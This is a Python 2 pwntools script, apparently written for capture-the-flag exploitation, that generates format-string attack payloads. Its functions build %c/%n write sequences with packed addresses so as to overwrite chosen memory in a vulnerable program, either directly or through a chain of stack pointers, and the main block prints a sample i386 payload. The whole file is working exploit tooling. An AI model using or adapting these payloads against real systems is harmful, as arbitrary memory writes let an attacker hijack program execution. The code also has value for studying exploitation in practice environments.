from pwn import *

config = {
    'i386' : {
        'byte': (4, 1, 0xFF, 'hh', 8),
        'short': (2, 2, 0xFFFF, 'h', 16),
        'int': (1, 4, 0xFFFFFFFF, '', 32)},
    'amd64' : {
        'byte': (8, 1, 0xFF, 'hh', 8),
        'short': (4, 2, 0xFFFF, 'h', 16),
        'int': (2, 4, 0xFFFFFFFF, '', 32)
    }
}

def fmt_payload(offset,address,value,n=0,written=0,arch='amd64',typex='byte'):
    '''
        offset is the deviation you found
        address is the target you want to write
        value is the value you want to write
        n is how many you want to write
        written doesn't work well,don't use it now.
        arch is the arch of the program , 32 or 64
        type is which way you want to use.
    '''
    assert(type(value)==int)
    if(value > int('F'*(2*config[arch]['byte'][0]),16)):
        print "Value is too large!"
        exit()
    if n == 0:
        n = config[arch][typex][0]
    payload = []
    dicts = []
    slen = 0
    soffset = offset
    for i in range(n):
        sbyte = value>>(i*config[arch][typex][4])&config[arch][typex][2]
        saddress = address+i*config[arch][typex][1]
        dicts.append({'address':saddress,'byte':sbyte})
    dicts = sorted(dicts,key=lambda i:i['byte'])
    now = 0
    for i in dicts:
        if i['byte'] == now:
            spayload = "%{soffset}$"+config[arch][typex][3]+"n"
        else:
            spayload = ("%{byte}c%{soffset}$"+config[arch][typex][3]+"n").format(byte=str(i['byte']-now),soffset = '{soffset}')
        now = i['byte']
        slen += len(spayload) - len('soffset')
        payload.append(spayload)
    padlen = 0 if slen%config[arch]['byte'][0] == 0 else config[arch]['byte'][0]-slen%config[arch]['byte'][0]
    slen += padlen
    soffset += slen/config[arch]['byte'][0]
    payload.append('A'*padlen)
    for i in dicts:
        if arch == 'amd64':
            payload.append(p64(i['address']))
        if arch == 'i386':
            payload.append(p32(i['address']))
    for i in range(n):
        payload[i] = payload[i].format(soffset=str(soffset).rjust(2,'0'))
        soffset += 1
    return ''.join(payload)

def fmt_bss(offset1,offset2,address,value,n=0,written=0,arch='amd64',typex='byte'):
    '''
    p3 is the target
    p1:p2->p3
    p2:p3
    p4:0x1234
    use p1 to change p2->p4
    use p2 to change p4 to the value
    '''
    assert(type(value)==int)
    if(value > int('F'*(2*config[arch]['byte'][0]),16)):
        print "Value is too large!"
        exit()
    if n == 0:
        n = config[arch][typex][0]
    payload = []
    tmp = "%{byte}c%{soffset}$"+config[arch][typex][3]+"n"
    for i in range(n):
        saddress = address + i*config[arch][typex][1]
        byte1 = saddress&0xff
        tmp1 = "%{byte}c%{soffset}$hhn".format(byte=byte1,soffset=offset1)
        payload.append(tmp1)
        byte2 = value>>(i*config[arch][typex][4])&config[arch][typex][2]
        tmp2 = tmp.format(byte=byte2,soffset=offset2)
        payload.append(tmp2)
    return payload

    


if __name__ == "__main__":
    # print '|'.join(fmt_bss(10,18,0x4c,0x80485AB,arch='i386',n=2,typex='short'))
    print fmt_bss(10,18,0x4c,0x80485AB,arch='i386',n=2,typex='short')
